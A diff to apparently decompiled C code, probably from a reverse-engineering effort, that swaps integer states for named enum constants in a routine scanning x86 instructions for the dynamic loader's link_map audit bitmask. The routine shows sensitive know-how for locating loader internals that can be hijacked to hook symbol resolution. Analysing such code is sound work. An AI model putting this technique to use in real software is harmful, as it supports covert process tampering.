@@ -31,7 +31,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
   long ctx_clear_idx;
   u8 *computed_slot_ptr;
   dasm_ctx_t *ctx_zero_cursor;
-  int pattern_state;
+  audit_pattern_state_t pattern_state;
   u8 *audit_walk_cursor;
   u8 bit_test_register;
   dasm_ctx_t insn_ctx;
@@ -64,7 +64,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
     if (getuid_stub != (pfn_getuid_t)0x0) {
       libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
-    pattern_state = 0;
+    pattern_state = AUDIT_PAT_EXPECT_LEA;
     bit_test_register = 0xff;
     for (; audit_walk_cursor < search_ctx->end_addr; audit_walk_cursor = audit_walk_cursor + insn_ctx.instruction_size) {
       success = x86_dasm(&insn_ctx,audit_walk_cursor,search_ctx->end_addr);
@@ -72,7 +72,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
         return FALSE;
       }
       // AutoDoc: State 0 looks for the LEA that materialises `link_map::l_name` + displacement.
-      if (pattern_state == 0) {
+      if (pattern_state == AUDIT_PAT_EXPECT_LEA) {
         if (((insn_ctx._40_4_ == 0x1036) && (((ushort)insn_ctx.prefix._0_4_ & 0x140) == 0x140)) &&
            ((byte)(insn_ctx.prefix._13_1_ - 1) < 2)) {
           decoded_pointer_register = 0;
@@ -116,12 +116,12 @@ BOOL find_link_map_l_audit_any_plt_bitmask
           if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == computed_slot_ptr) &&
              (((int)(uint)*(ushort *)search_ctx->output_register >> (decoded_pointer_register & 0x1f) & 1U) != 0)) {
             *(u8 *)((long)search_ctx->output_register + 2) = decoded_mask_register;
-            pattern_state = 1;
+            pattern_state = AUDIT_PAT_EXPECT_MOV;
           }
         }
       }
       // AutoDoc: State 1 waits for the MOV that copies the pointer into a trackable register.
-      else if (pattern_state == 1) {
+      else if (pattern_state == AUDIT_PAT_EXPECT_MOV) {
         if ((insn_ctx._40_4_ & 0xfffffffd) == 0x89) {
           register_filter = search_ctx->output_register_to_match;
           decoded_pointer_register = insn_ctx.prefix.decoded.flags & 0x40;
@@ -164,7 +164,7 @@ LAB_00104d83:
 LAB_00104da9:
             if ((decoded_pointer_register != decoded_register) || (search_ctx->output_register[2] != decoded_mask_register)) goto LAB_00104e97;
           }
-          pattern_state = 2;
+          pattern_state = AUDIT_PAT_EXPECT_TEST;
           bit_test_register = decoded_pointer_register;
           if (insn_ctx._40_4_ != 0x89) {
             bit_test_register = decoded_mask_register;
@@ -172,7 +172,7 @@ LAB_00104da9:
         }
       }
       // AutoDoc: State 2 requires a TEST/BT against the same register before we evaluate the mask.
-      else if (pattern_state == 2) {
+      else if (pattern_state == AUDIT_PAT_EXPECT_TEST) {
         if (insn_ctx._40_4_ == 0x128) {
           decoded_register = 0;
         }
